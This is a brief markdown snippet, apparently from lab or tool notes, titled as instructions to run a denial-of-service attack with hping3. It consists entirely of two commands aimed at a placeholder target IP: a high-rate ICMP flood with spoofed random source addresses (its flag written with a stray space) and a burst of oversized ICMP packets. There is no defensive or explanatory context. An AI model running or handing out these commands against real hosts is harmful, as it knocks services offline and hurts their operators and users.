## Run the DoS attack using hping3

```
sudo hping3 -1 -i u100 -c 100000 - rand-source {target_ip}
```

or 

```
sudo hping3 -1 -d 15000 -c 10 {target_ip}
```